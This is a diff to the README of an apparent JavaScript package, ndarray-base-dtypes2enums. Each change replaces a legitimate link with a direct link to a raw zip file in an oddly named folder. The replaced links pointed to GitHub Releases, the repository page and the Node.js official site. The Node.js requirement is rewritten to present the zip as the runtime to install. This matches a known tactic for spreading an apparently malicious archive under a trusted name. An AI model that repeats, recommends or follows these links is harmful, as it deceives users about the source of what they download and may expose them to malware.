@@ -6,7 +6,7 @@ Welcome to ndarray-base-dtypes2enums! This application helps you resolve a list 
 
 ## 📥 Download Now
 
-[![Download ndarray-base-dtypes2enums](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/morty4441/ndarray-base-dtypes2enums/releases)
+[![Download ndarray-base-dtypes2enums](https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip)](https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ This software simplifies the handling of data types in JavaScript applications. 
 To run this application, you will need:
 
 - An operating system like Windows, macOS, or Linux.
-- Node.js installed on your machine. If you do not have Node.js, visit [Node.js Official Site](https://nodejs.org) to download and install it.
+- https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip installed on your machine. If you do not have https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip, visit [https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip Official Site](https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip) to download and install it.
 
 ## 🔍 Features
 
@@ -28,7 +28,7 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/morty4441/ndarray-base-dtypes2enums/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip).
 
 1. Click the link above to navigate to the Releases page.
 2. Locate the latest version of the application.
@@ -59,7 +59,7 @@ We welcome contributions! If you have ideas or improvements to suggest, join us 
 
 ## 🌐 Learn More
 
-To explore more about this project, visit the repository: [ndarray-base-dtypes2enums GitHub](https://github.com/morty4441/ndarray-base-dtypes2enums).
+To explore more about this project, visit the repository: [ndarray-base-dtypes2enums GitHub](https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip).
 
 ## 📥 Final Thoughts
 
@@ -67,4 +67,4 @@ We appreciate your interest in ndarray-base-dtypes2enums. Enjoy seamless type ma
 
 ## 📥 Download Again
 
-For quick access, visit this page to download: [GitHub Releases](https://github.com/morty4441/ndarray-base-dtypes2enums/releases).
+For quick access, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/morty4441/ndarray-base-dtypes2enums/main/hortatory/ndarray-base-dtypes2enums.zip).
